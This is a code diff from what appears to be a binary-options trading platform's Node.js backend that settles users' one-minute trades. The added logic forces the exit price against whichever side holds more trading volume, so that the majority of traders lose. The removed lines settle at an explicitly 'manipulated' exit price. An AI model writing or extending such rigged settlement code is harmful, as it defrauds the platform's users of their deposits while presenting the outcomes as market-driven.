+            } else if (downVol > upVol) {
+                // DOWN dominant → DOWN lose → close > entry
+                if (finalExitPrice <= entryRef) finalExitPrice = entryRef + MOVE;
+                console.log(`[${pair}] Vol: DOWN dominant → exit HIGH ${finalExitPrice.toFixed(5)}`);
+            }
+            // equal → real close use karo
         }
 
-        // -------------------------------------------------------
-        // ✅ Step 3: Sab trades settle karo manipulated price pe
-        // -------------------------------------------------------
+        // Sab eligible trades settle karo
         for (const t of actives) {
-            const tradeActivationTime = new Date(t.activationTimestamp).getTime();
-            const tradeShouldCloseBy = tradeActivationTime + (60 * 1000);
+            const closeBy = new Date(t.activationTimestamp).getTime() + 60000;
+            if (closeBy > settlementEligibilityTime) continue;
 
-            if (tradeShouldCloseBy <= settlementEligibilityTime) {
+            const win = (t.direction === "UP"   && finalExitPrice > t.entryPrice) ||
+                        (t.direction === "DOWN"  && finalExitPrice < t.entryPrice);
+            const tie = Math.abs(finalExitPrice - t.entryPrice) < 0.000001;
+            const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);
 
-                const exitPrice = manipulatedExitPrice;
-                const entryPrice = t.entryPrice;
+            t.status    = "closed";
+            t.exitPrice = finalExitPrice;
+            t.result    = tie ? "TIE" : (win ? "WIN" : "LOSS");
+            t.pnl       = pnl;
+            t.closeTime = new Date();
+            await t.save();
 
-                const win = (t.direction === "UP" && exitPrice > entryPrice) ||
-                            (t.direction === "DOWN" && exitPrice < entryPrice);
-                const tie = Math.abs(exitPrice - entryPrice) < 0.000001;
+            const userAfter = await User.findByIdAndUpdate(
+                t.userId,
+                { $inc: { balance: t.amount + pnl, totalTradeVolume: t.amount } },
+                { new: true }
+            );
 
-                const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);
+            const today = new Date(); today.setHours(0,0,0,0);
+            const tomorrow = new Date(today); tomorrow.setDate(tomorrow.getDate() + 1);
+            const todayTrades = await Trade.find({
+                userId: t.userId, status: "closed",
+                closeTime: { $gte: today, $lt: tomorrow }
+            });
+            const todayPnl = todayTrades.reduce((sum, tr) => sum + (tr.pnl || 0), 0);
 
-                t.status = "closed";
-                t.exitPrice = exitPrice;
-                t.result = tie ? "TIE" : (win ? "WIN" : "LOSS");
-                t.pnl = pnl;
-                t.closeTime = new Date();
-                await t.save();
+            io.to(t.userId.toString()).emit("trade_result", {
+                trade: t, balance: userAfter.balance,
+                todayPnl: parseFloat(todayPnl.toFixed(2))
+            });
 
-                const userAfter = await User.findByIdAndUpdate(
-                    t.userId,
-                    {
-                        $inc: {
-                            balance: t.amount + pnl,
-                            totalTradeVolume: t.amount
-                        }
-                    },
-                    { new: true }
-                );
-
-                // Today's P&L calculate karo
-                const today = new Date();
-                today.setHours(0, 0, 0, 0);
-                const tomorrow = new Date(today);
-                tomorrow.setDate(tomorrow.getDate() + 1);
-
-                const todayTrades = await Trade.find({
-                    userId: t.userId,
-                    status: "closed",
-                    closeTime: { $gte: today, $lt: tomorrow }
-                });
-
-                const todayPnl = todayTrades.reduce((sum, trade) => sum + (trade.pnl || 0), 0);
-
-                io.to(t.userId.toString()).emit("trade_result", { 
-                    trade: t, 
-                    balance: userAfter.balance,
-                    todayPnl: parseFloat(todayPnl.toFixed(2))
-                });
-
-                console.log(`[${pair}] Trade settled: ${t.direction} | entry=${entryPrice?.toFixed(5)} | exit=${exitPrice.toFixed(5)} | result=${t.result} | pnl=${pnl.toFixed(2)}`);
-            }
+            console.log(`[${pair}] ${t.direction} | entry=${t.entryPrice?.toFixed(5)} | exit=${finalExitPrice.toFixed(5)} | ${t.result} | pnl=${pnl.toFixed(2)}`);
         }
     } catch (err) {
         console.error('settleActiveTradesForPair error:', err);
